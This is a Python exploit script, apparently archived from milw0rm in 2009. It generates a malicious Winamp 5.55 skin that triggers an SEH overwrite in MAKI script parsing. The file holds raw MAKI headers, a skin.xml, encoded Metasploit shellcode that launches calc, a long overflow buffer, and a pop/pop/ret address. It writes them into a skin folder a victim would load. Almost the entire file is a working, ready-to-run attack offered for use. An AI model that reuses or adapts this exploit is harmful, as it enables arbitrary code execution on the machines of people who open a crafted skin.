#usage: python winamp_maki_script.py
#Note : I got problem while using this python file under windows,but it works great under ubuntu :p
print "**************************************************************************"
print " Winamp <= 5.55 (MAKI script) Universal Seh Overwrite Exploit\n"
print " Advisory : http://vrt-sourcefire.blogspot.com/2009/05/winamp-maki-parsing-vulnerability.html\n"
print " Exploit code: His0k4\n"
print " Tested on: Windows XP Pro SP3 (EN)\n"
print " Greetings to:"
print " All friends & muslims HaCkers(dz),snakespc.com\n"
print " Serra7 Merra7,Koulchi Mderra7\n"
print "**************************************************************************"

import os

header1=(
"\x46\x47\x03\x04\x17\x00\x00\x00\x27\x00\x00\x00\x71\x49\x65\x51\x87\x0d\x51\x4a"
"\x91\xe3\xa6\xb5\x32\x35\xf3\xe7\x64\x0f\xf5\xd6\xfa\x93\xb7\x49\x93\xf1\xba\x66"
"\xef\xae\x3e\x98\x7b\xc4\x0d\xe9\x0d\x84\xe7\x4a\xb0\x2c\x04\x0b\xd2\x75\xf7\xfc"
"\xb5\x3a\x02\xb2\x4d\x43\xa1\x4b\xbe\xae\x59\x63\x75\x03\xf3\xc6\x78\x57\xc6\x87"
"\x43\xe7\xfe\x49\x85\xf9\x09\xcc\x53\x2a\xfd\x56\x65\x36\x60\x38\x1b\x46\xa7\x42"
"\xaa\x75\xd8\x3f\x66\x67\xbf\x73\xf4\x7a\x78\xf4\xbb\xb2\xf7\x4e\x9c\xfb\xe7\x4b"
"\xa9\xbe\xa8\x8d\x02\x0c\x37\x3a\xbf\x3c\x9f\x43\x84\xf1\x86\x88\x5b\xcf\x1e\x36"
"\xb6\x5b\x0c\x5d\xe1\x7d\x1f\x4b\xa7\x0f\x8d\x16\x59\x94\x19\x41\x99\xe1\xe3\x4e"
"\x36\xc6\xec\x4b\x97\xcd\x78\xbc\x9c\x86\x28\xb0\xe5\x95\xbe\x45\x72\x20\x91\x41"
"\x93\x5c\xbb\x5f\xf9\xf1\x17\xfd\x4e\x6d\x90\x60\x7e\x53\x2e\x48\xb0\x04\xcc\x94"
"\x61\x88\x56\x72\xc0\xbc\x3a\x40\x22\x6f\xd6\x4b\x8b\xa4\x10\xc8\x29\x93\x25\x47"
"\x4d\x3e\xaa\x97\xd0\xf4\xa8\x4f\x81\x7b\x0a\xf2\x2a\x45\x49\x83\xfa\xbb\xe4\x64"
"\xf4\x81\xd9\x49\xb0\xc0\xa8\x5b\x2e\xc3\xbc\xfd\x3f\x5e\xb6\x62\x5e\x37\x8d\x40"
"\x8d\xea\x76\x81\x4a\xb9\x1b\x77\xbe\x97\x4f\xce\xb0\x77\x19\x4e\x99\x56\xd4\x98"
"\x33\xc9\x6c\x27\x0d\x20\xc2\xa8\xeb\x51\x2a\x4b\xba\x7f\x5d\x4b\xc6\x5d\x4c\x71"
"\x38\xba\x1e\x8d\x9e\x48\x3e\x48\xb9\x60\x8d\x1f\x43\xc5\xc4\x05\x40\xc9\x08\x0f"
"\x39\xaf\x23\x4b\x80\xf3\xb8\xc4\x8f\x7e\xbb\x59\x72\x86\xaa\xef\x0e\x31\xfa\x41"
"\xb7\xdc\x85\xa9\x52\x5b\xcb\x4b\x44\x32\xfd\x7d\x51\x37\x7c\x4e\xbf\x40\x82\xae"
"\x5f\x3a\xdc\x33\x15\xfa\xb9\x5a\x7d\x9a\x57\x45\xab\xc8\x65\x57\xa6\xc6\x7c\xa9"
"\xcd\xdd\x8e\x69\x1e\x8f\xec\x4f\x9b\x12\xf9\x44\xf9\x09\xff\x45\x27\xcd\x64\x6b"
"\x26\x5a\x4b\x4c\x8c\x59\xe6\xa7\x0c\xf6\x49\x3a\xe4\x05\xcb\x6d\xc4\x8a\xc2\x48"
"\xb1\x93\x49\xf0\x91\x0e\xf5\x4a\xff\xcf\xdc\xb4\xfe\x81\xcc\x4b\x96\x1b\x72\x0f"
"\xd5\xbe\x0f\xff\xe1\x8c\xe2\x01\x59\xb0\xd5\x11\x97\x9f\xe4\xde\x6f\x51\x76\x0a"
"\xbd\xf8\xf0\x80\xa5\x1b\xa6\x42\xa0\x93\x32\x36\xa0\x0c\x8d\x4a\x1b\x34\x2e\x9b"
"\x98\x6c\xfa\x40\x8b\x85\x0c\x1b\x6e\xe8\x94\x05\x71\x9b\xd5\x36\xfd\x03\xf8\x4a"
"\x97\x95\x05\x02\xb7\xdb\x26\x7a\x10\xf2\xd5\x7f\xc4\xac\xdf\x48\xa6\xa0\x54\x51"
"\x57\x6c\xdc\x76\x35\xa5\xba\xb5\xb3\x05\xcb\x4d\xad\xc1\xe6\x18\xd2\x8f\x68\x96"
"\xc1\xfe\x29\x61\xb7\xda\x51\x4d\x91\x65\x01\xca\x0c\x1b\x70\xdb\xf7\x14\x95\xd5"
"\x36\xed\xe8\x45\x98\x0f\x3f\x4e\xa0\x52\x2c\xd9\x82\x4b\x3b\x9b\x7a\x66\x0e\x42"
"\x8f\xfc\x79\x41\x15\x80\x9c\x02\x99\x31\xed\xc7\x19\x53\x98\x47\x98\x63\x60\xb1"
"\x5a\x29\x8c\xaa\x4d\xc1\xbb\xe2\xf6\x84\x73\x41\xbd\xb3\xb2\xeb\x2f\x66\x55\x50"
"\x94\x05\xc0\x73\x1f\x96\x1b\x40\x9b\x1b\x67\x24\x27\xac\x41\x65\x0e\x00\x00\x00"
"\x01\x01\x00\x00\xab\xb0")


header2=(
"\x01\x01\x00\x00\x0b\x00\x67\x65\x74\x53\x6b\x69\x6e\x4e\x61\x6d\x65\x01\x01\x00"
"\x00\x0d\x00\x67\x65\x74\x50\x72\x69\x76\x61\x74\x65\x49\x6e\x74\x01\x01\x00\x00"
"\x0c\x00\x67\x65\x74\x54\x69\x6d\x65\x4f\x66\x44\x61\x79\x01\x01\x00\x00\x0d\x00"
"\x73\x65\x74\x50\x72\x69\x76\x61\x74\x65\x49\x6e\x74\x01\x01\x00\x00\x0a\x00\x6d"
"\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x01\x01\x00\x00\x0f\x00\x69\x6e\x74\x65\x67"
"\x65\x72\x54\x6f\x53\x74\x72\x69\x6e\x67\x01\x01\x00\x00\x0e\x00\x6f\x6e\x53\x63"
"\x72\x69\x70\x74\x4c\x6f\x61\x64\x65\x64\x01\x01\x00\x00\x0e\x00\x67\x65\x74\x53"
"\x63\x72\x69\x70\x74\x47\x72\x6f\x75\x70\x0a\x01\x00\x00\x09\x00\x67\x65\x74\x4f"
"\x62\x6a\x65\x63\x74\x17\x01\x00\x00\x0b\x00\x6f\x6e\x4c\x65\x66\x74\x43\x6c\x69"
"\x63\x6b\x01\x01\x00\x00\x12\x00\x6e\x61\x76\x69\x67\x61\x74\x65\x55\x72\x6c\x42"
"\x72\x6f\x77\x73\x65\x72\x01\x01\x00\x00\x19\x00\x67\x65\x74\x50\x6c\x61\x79\x49"
"\x74\x65\x6d\x4d\x65\x74\x61\x44\x61\x74\x61\x53\x74\x72\x69\x6e\x67\x01\x01\x00"
"\x00\x17\x00\x67\x65\x74\x50\x6c\x61\x79\x49\x74\x65\x6d\x44\x69\x73\x70\x6c\x61"
"\x79\x54\x69\x74\x6c\x65\x1f\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x01\x01\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x04\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x02\x00\x00\x00\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x01\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x02\x00\x00\x00\x88\x13\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x17\x01\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x0e\x00\x00\x00\x07\x00\x00\x00\x0c\x00\x72\x75\x6e\x74\x69\x6d"
"\x65\x63\x68\x65\x63\x6b\x0c\x00\x00\x00\x15\x00\x54\x68\x69\x73\x20\x73\x63\x72"
"\x69\x70\x74\x20\x72\x65\x71\x75\x69\x72\x65\x73\x20\x0d\x00\x00\x00\x1f\x00\x57"
"\x69\x6e\x61\x6d\x70\x20\x35\x2e\x35\x34\x20\x28\x73\x6b\x69\x6e\x20\x76\x65\x72"
"\x73\x69\x6f\x6e\x20\x31\x2e\x33\x34\x29\x0e\x00\x00\x00\x05\x00\x45\x72\x72\x6f"
"\x72\x0f\x00\x00\x00\x00\x00\x11\x00\x00\x00\x05\x00\x44\x45\x42\x55\x47\x14\x00"
"\x00\x00\x0a\x00\x6e\x6f\x77\x70\x6c\x61\x79\x69\x6e\x67\x16\x00\x00\x00\x12\x00"
"\x77\x69\x6e\x73\x68\x61\x64\x65\x69\x63\x6f\x6e\x6d\x6f\x64\x65\x72\x6e\x18\x00"
"\x00\x00\x31\x00\x68\x74\x74\x70\x3a\x2f\x2f\x63\x6c\x69\x65\x6e\x74\x2e\x77\x69"
"\x6e\x61\x6d\x70\x2e\x63\x6f\x6d\x2f\x6e\x6f\x77\x70\x6c\x61\x79\x69\x6e\x67\x2f"
"\x61\x72\x74\x69\x73\x74\x2f\x3f\x69\x63\x69\x64\x3d\x19\x00\x00\x00\x0c\x00\x26"
"\x61\x72\x74\x69\x73\x74\x4e\x61\x6d\x65\x3d\x1a\x00\x00\x00\x06\x00\x61\x72\x74"
"\x69\x73\x74\x1c\x00\x00\x00\x0b\x00\x75\x76\x6f\x78\x2f\x61\x72\x74\x69\x73\x74"
"\x1d\x00\x00\x00\x0a\x00\x63\x62\x73\x2f\x61\x72\x74\x69\x73\x74\x1e\x00\x00\x00"
"\x0b\x00\x73\x74\x72\x65\x61\x6d\x74\x69\x74\x6c\x65\x02\x00\x00\x00\x00\x00\x00"
"\x00\x07\x00\x00\x00\x53\x01\x00\x00\x13\x00\x00\x00\x0a\x00\x00\x00\x86\x01\x00"
"\x00\xd1\x02\x00\x00\x01\x03\x00\x00\x00\x01\x00\x00\x00\x00\x18\x00\x00\x00\x00"
"\x30\x02\x01\x03\x00\x00\x00\x01\x04\x00\x00\x00\x0c\x01\x03\x00\x00\x00\x01\x05"
"\x00\x00\x00\x0a\x51\x10\xb9\x00\x00\x00\x01\x02\x00\x00\x00\x01\x06\x00\x00\x00"
"\x30\x02\x01\x09\x00\x00\x00\x01\x00\x00\x00\x00\x01\x08\x00\x00\x00\x01\x07\x00"
"\x00\x00\x01\x00\x00\x00\x00\x18\x01\x00\x00\x00\x18\x02\x00\x00\x00\x30\x02\x01"
"\x0a\x00\x00\x00\x01\x00\x00\x00\x00\x18\x03\x00\x00\x00\x30\x02\x01\x0a\x00\x00"
"\x00\x01\x09\x00\x00\x00\x41\x01\x0b\x00\x00\x00\x0c\x01\x09\x00\x00\x00\x01\x0a"
"\x00\x00\x00\x0c\x50\x10\x06\x00\x00\x00\x01\x08\x00\x00\x00\x21\x01\x00\x00\x00"
"\x00\x01\x00\x00\x00\x00\x18\x03\x00\x00\x00\x01\x07\x00\x00\x00\x01\x00\x00\x00"
"\x00\x18\x01\x00\x00\x00\x18\x04\x00\x00\x00\x02\x01\x00\x00\x00\x00\x01\x0f\x00"
"\x00\x00\x01\x06\x00\x00\x00\x01\x0e\x00\x00\x00\x01\x0c\x00\x00\x00\x01\x0d\x00"
"\x00\x00\x40\x18\x05\x00\x00\x00\x02\x01\x08\x00\x00\x00\x21\x01\x06\x00\x00\x00"
"\x21\x01\x01\x00\x00\x00\x21\x03\x10\x00\x00\x00\x01\x00\x00\x00\x00\x01\x0f\x00"
"\x00\x00\x01\x08\x00\x00\x00\x01\x11\x00\x00\x00\x01\x10\x00\x00\x00\x70\x05\x00"
"\x00\x00\x04\x02\x01\x01\x00\x00\x00\x21\x03\x12\x00\x00\x00\x01\x00\x00\x00\x00"
"\x01\x0f\x00\x00\x00\x01\x08\x00\x00\x00\x01\x11\x00\x00\x00\x01\x00\x00\x00\x00"
"\x01\x12\x00\x00\x00\x70\x06\x00\x00\x00\x01\x70\x05\x00\x00\x00\x04\x02\x01\x01"
"\x00\x00\x00\x21\x19\xa8\xfe\xff\xff\x11\x06\x00\x00\x00\x01\x01\x00\x00\x00\x21"
"\x01\x13\x00\x00\x00\x01\x00\x00\x00\x00\x70\x08\x00\x00\x00\x00\x01\x14\x00\x00"
"\x00\x70\x09\x00\x00\x00\x01\x30\x02\x01\x01\x00\x00\x00\x21\x01\x02\x00\x00\x00"
"\x10\x06\x00\x00\x00\x01\x01\x00\x00\x00\x21\x01\x15\x00\x00\x00\x19\x4d\x00\x00"
"\x00\x30\x02\x01\x15\x00\x00\x00\x01\x0f\x00\x00\x00\x08\x10\x06\x00\x00\x00\x01"
"\x01\x00\x00\x00\x21\x01\x17\x00\x00\x00\x01\x16\x00\x00\x00\x30\x02\x01\x00\x00"
"\x00\x00\x01\x18\x00\x00\x00\x01\x17\x00\x00\x00\x40\x01\x19\x00\x00\x00\x40\x01"
"\x15\x00\x00\x00\x40\x70\x0b\x00\x00\x00\x01\x02\x01\x01\x00\x00\x00\x21\x01\x1b"
"\x00\x00\x00\x01\x00\x00\x00\x00\x01\x1a\x00\x00\x00\x70\x0c\x00\x00\x00\x01\x30"
"\x02\x01\x1b\x00\x00\x00\x01\x0f\x00\x00\x00\x08\x10\x17\x00\x00\x00\x01\x1b\x00"
"\x00\x00\x01\x00\x00\x00\x00\x01\x1c\x00\x00\x00\x70\x0c\x00\x00\x00\x01\x30\x02"
"\x01\x1b\x00\x00\x00\x01\x0f\x00\x00\x00\x08\x10\x17\x00\x00\x00\x01\x1b\x00\x00"
"\x00\x01\x00\x00\x00\x00\x01\x1d\x00\x00\x00\x70\x0c\x00\x00\x00\x01\x30\x02\x01"
"\x1b\x00\x00\x00\x01\x0f\x00\x00\x00\x08\x10\x17\x00\x00\x00\x01\x1b\x00\x00\x00"
"\x01\x00\x00\x00\x00\x01\x1e\x00\x00\x00\x70\x0c\x00\x00\x00\x01\x30\x02\x01\x1b"
"\x00\x00\x00\x01\x0f\x00\x00\x00\x08\x10\x12\x00\x00\x00\x01\x1b\x00\x00\x00\x01"
"\x00\x00\x00\x00\x70\x0d\x00\x00\x00\x00\x30\x02\x01\x1b\x00\x00\x00\x21\x01\x01"
"\x00\x00\x00\x21\x21\x01\x01\x00\x00\x00\x21\x21\x01\x01\x00\x00\x00\x21\x21\x01"
"\x01\x00\x00\x00\x21\x21\x01\x01\x00\x00\x00\x21\x21\x01\x01\x00\x00\x00\x21\x21"
"\x01\x01\x00\x00\x00\x21")


skin_xml=(
"\x3c\x3f\x78\x6d\x6c\x20\x76\x65\x72\x73\x69\x6f\x6e\x3d\x22\x31\x2e\x30\x22\x20\x65\x6e\x63\x6f\x64"
"\x69\x6e\x67\x3d\x22\x55\x54\x46\x2d\x38\x22\x20\x73\x74\x61\x6e\x64\x61\x6c\x6f\x6e\x65\x3d\x22\x79"
"\x65\x73\x22\x3f\x3e\x0d\x0a\x0d\x0a\x3c\x57\x69\x6e\x61\x6d\x70\x41\x62\x73\x74\x72\x61\x63\x74\x69"
"\x6f\x6e\x4c\x61\x79\x65\x72\x20\x76\x65\x72\x73\x69\x6f\x6e\x3d\x22\x31\x2e\x33\x34\x22\x3e\x0d\x0a"
"\x09\x3c\x73\x6b\x69\x6e\x69\x6e\x66\x6f\x3e\x0d\x0a\x09\x09\x3c\x76\x65\x72\x73\x69\x6f\x6e\x3e\x31"
"\x2e\x32\x3c\x2f\x76\x65\x72\x73\x69\x6f\x6e\x3e\x0d\x0a\x09\x09\x3c\x6e\x61\x6d\x65\x3e\x42\x65\x6e"
"\x74\x6f\x3c\x2f\x6e\x61\x6d\x65\x3e\x0d\x0a\x09\x09\x3c\x61\x75\x74\x68\x6f\x72\x3e\x48\x69\x73\x30"
"\x6b\x34\x3c\x2f\x61\x75\x74\x68\x6f\x72\x3e\x0d\x0a\x09\x09\x3c\x63\x6f\x6d\x6d\x65\x6e\x74\x3e\x48"
"\x69\x73\x30\x6b\x34\x3c\x2f\x63\x6f\x6d\x6d\x65\x6e\x74\x3e\x0d\x0a\x09\x09\x3c\x65\x6d\x61\x69\x6c"
"\x3e\x48\x69\x73\x30\x6b\x34\x2e\x68\x6c\x6d\x40\x67\x6d\x61\x69\x6c\x2e\x63\x6f\x6d\x3c\x2f\x65\x6d"
"\x61\x69\x6c\x3e\x0d\x0a\x09\x09\x3c\x73\x63\x72\x65\x65\x6e\x73\x68\x6f\x74\x3e\x48\x69\x73\x30\x6b"
"\x34\x2e\x70\x6e\x67\x3c\x2f\x73\x63\x72\x65\x65\x6e\x73\x68\x6f\x74\x3e\x0d\x0a\x09\x09\x3c\x68\x6f"
"\x6d\x65\x70\x61\x67\x65\x3e\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x73\x6e\x61\x6b\x65\x73\x70"
"\x63\x2e\x63\x6f\x6d\x2f\x3c\x2f\x68\x6f\x6d\x65\x70\x61\x67\x65\x3e\x0d\x0a\x09\x3c\x2f\x73\x6b\x69"
"\x6e\x69\x6e\x66\x6f\x3e\x0d\x0a\x0d\x0a\x09\x3c\x61\x63\x63\x65\x6c\x65\x72\x61\x74\x6f\x72\x73\x20"
"\x73\x65\x63\x74\x69\x6f\x6e\x3d\x22\x67\x65\x6e\x65\x72\x61\x6c\x22\x3e\x0d\x0a\x09\x09\x3c\x61\x63"
"\x63\x65\x6c\x65\x72\x61\x74\x6f\x72\x20\x62\x69\x6e\x64\x3d\x22\x41\x6c\x74\x2b\x46\x22\x20\x61\x63"
"\x74\x69\x6f\x6e\x3d\x22\x4d\x45\x4e\x55\x48\x4f\x54\x4b\x45\x59\x5f\x46\x49\x4c\x45\x22\x20\x2f\x3e"
"\x0d\x0a\x09\x09\x3c\x61\x63\x63\x65\x6c\x65\x72\x61\x74\x6f\x72\x20\x62\x69\x6e\x64\x3d\x22\x41\x6c"
"\x74\x2b\x50\x22\x20\x61\x63\x74\x69\x6f\x6e\x3d\x22\x4d\x45\x4e\x55\x48\x4f\x54\x4b\x45\x59\x5f\x50"
"\x4c\x41\x59\x22\x20\x2f\x3e\x0d\x0a\x09\x09\x3c\x61\x63\x63\x65\x6c\x65\x72\x61\x74\x6f\x72\x20\x62"
"\x69\x6e\x64\x3d\x22\x41\x6c\x74\x2b\x4f\x22\x20\x61\x63\x74\x69\x6f\x6e\x3d\x22\x4d\x45\x4e\x55\x48"
"\x4f\x54\x4b\x45\x59\x5f\x4f\x50\x54\x49\x4f\x4e\x53\x22\x20\x2f\x3e\x0d\x0a\x09\x09\x3c\x61\x63\x63"
"\x65\x6c\x65\x72\x61\x74\x6f\x72\x20\x62\x69\x6e\x64\x3d\x22\x41\x6c\x74\x2b\x49\x22\x20\x61\x63\x74"
"\x69\x6f\x6e\x3d\x22\x4d\x45\x4e\x55\x48\x4f\x54\x4b\x45\x59\x5f\x56\x49\x45\x57\x22\x20\x2f\x3e\x0d"
"\x0a\x09\x09\x3c\x61\x63\x63\x65\x6c\x65\x72\x61\x74\x6f\x72\x20\x62\x69\x6e\x64\x3d\x22\x41\x6c\x74"
"\x2b\x48\x22\x20\x61\x63\x74\x69\x6f\x6e\x3d\x22\x4d\x45\x4e\x55\x48\x4f\x54\x4b\x45\x59\x5f\x48\x45"
"\x4c\x50\x22\x20\x2f\x3e\x0d\x0a\x09\x3c\x2f\x61\x63\x63\x65\x6c\x65\x72\x61\x74\x6f\x72\x73\x3e\x0d"
"\x0a\x0d\x0a\x09\x3c\x61\x63\x63\x65\x6c\x65\x72\x61\x74\x6f\x72\x73\x20\x73\x65\x63\x74\x69\x6f\x6e"
"\x3d\x22\x6e\x6f\x72\x6d\x61\x6c\x22\x3e\x0d\x0a\x09\x09\x09\x3c\x61\x63\x63\x65\x6c\x65\x72\x61\x74"
"\x6f\x72\x20\x62\x69\x6e\x64\x3d\x22\x73\x70\x61\x63\x65\x22\x20\x61\x63\x74\x69\x6f\x6e\x3d\x22\x53"
"\x48\x4f\x57\x5f\x43\x55\x52\x52\x45\x4e\x54\x5f\x54\x52\x41\x43\x4b\x22\x20\x2f\x3e\x0d\x0a\x09\x3c"
"\x2f\x61\x63\x63\x65\x6c\x65\x72\x61\x74\x6f\x72\x73\x3e\x0d\x0a\x0d\x0a\x09\x3c\x21\x2d\x2d\x20\x54"
"\x68\x69\x73\x20\x53\x6b\x69\x6e\x20\x75\x73\x65\x73\x20\x73\x68\x61\x72\x65\x64\x20\x47\x72\x61\x70"
"\x68\x69\x63\x73\x2c\x20\x58\x4d\x4c\x20\x61\x6e\x64\x20\x4d\x61\x6b\x69\x20\x66\x72\x6f\x6d\x20\x27"
"\x42\x69\x67\x20\x42\x65\x6e\x74\x6f\x27\x20\x2d\x2d\x3e\x0d\x0a\x0d\x0a\x09\x3c\x73\x63\x72\x69\x70"
"\x74\x73\x3e\x0d\x0a\x09\x09\x3c\x73\x63\x72\x69\x70\x74\x20\x66\x69\x6c\x65\x3d\x22\x2f\x73\x63\x72"
"\x69\x70\x74\x73\x2f\x32\x37\x2e\x6d\x61\x6b\x69\x22\x20\x70\x61\x72\x61\x6d\x3d\x22\x73\x6d\x61\x6c"
"\x6c\x22\x2f\x3e\x20\x3c\x21\x2d\x2d\x20\x4d\x75\x73\x74\x20\x62\x65\x20\x6c\x6f\x61\x64\x65\x64\x20"
"\x61\x74\x20\x66\x69\x72\x73\x74\x20\x2d\x2d\x3e\x0d\x0a\x09\x3c\x2f\x73\x63\x72\x69\x70\x74\x73\x3e"
"\x0d\x0a\x0d\x0a\x3c\x2f\x57\x69\x6e\x61\x6d\x70\x41\x62\x73\x74\x72\x61\x63\x74\x69\x6f\x6e\x4c\x61"
"\x79\x65\x72\x3e")

# win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
shellcode=(
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x34"
"\x42\x50\x42\x30\x42\x50\x4b\x38\x45\x44\x4e\x53\x4b\x48\x4e\x47"
"\x45\x30\x4a\x57\x41\x50\x4f\x4e\x4b\x48\x4f\x54\x4a\x31\x4b\x38"
"\x4f\x55\x42\x32\x41\x30\x4b\x4e\x49\x54\x4b\x58\x46\x33\x4b\x48"
"\x41\x30\x50\x4e\x41\x53\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c"
"\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x43\x46\x45\x46\x32\x46\x30\x45\x47\x45\x4e\x4b\x58"
"\x4f\x45\x46\x52\x41\x50\x4b\x4e\x48\x36\x4b\x48\x4e\x50\x4b\x44"
"\x4b\x58\x4f\x55\x4e\x51\x41\x50\x4b\x4e\x4b\x58\x4e\x51\x4b\x48"
"\x41\x30\x4b\x4e\x49\x48\x4e\x45\x46\x32\x46\x30\x43\x4c\x41\x53"
"\x42\x4c\x46\x46\x4b\x58\x42\x54\x42\x33\x45\x58\x42\x4c\x4a\x57"
"\x4e\x30\x4b\x58\x42\x34\x4e\x50\x4b\x48\x42\x37\x4e\x51\x4d\x4a"
"\x4b\x48\x4a\x36\x4a\x30\x4b\x4e\x49\x30\x4b\x48\x42\x38\x42\x4b"
"\x42\x30\x42\x30\x42\x30\x4b\x58\x4a\x46\x4e\x43\x4f\x55\x41\x43"
"\x48\x4f\x42\x46\x48\x45\x49\x58\x4a\x4f\x43\x38\x42\x4c\x4b\x47"
"\x42\x35\x4a\x46\x42\x4f\x4c\x38\x46\x30\x4f\x35\x4a\x46\x4a\x39"
"\x50\x4f\x4c\x58\x50\x50\x47\x35\x4f\x4f\x47\x4e\x43\x46\x41\x56"
"\x4e\x56\x43\x46\x42\x50\x5a")

payload = "\x41"*16756
payload += "\x74\x06\x90\x90"
payload += "\x32\x55\xF0\x12" # universal p/p/r in_mod.dll
payload += shellcode

try:
    os.mkdir("dz_skin")
    os.mkdir("dz_skin/scripts")
    out_maki = open(r'dz_skin/scripts/27.maki', 'w')
    out_maki.write(header1+payload+header2)
    out_maki.close()
    out_xml = open(r'dz_skin/skin.xml', 'w')
    out_xml.write(skin_xml)
    out_xml.close()
    raw_input("\nSkin's files created!\n")
except:
    print "Error"

# milw0rm.com [2009-05-22]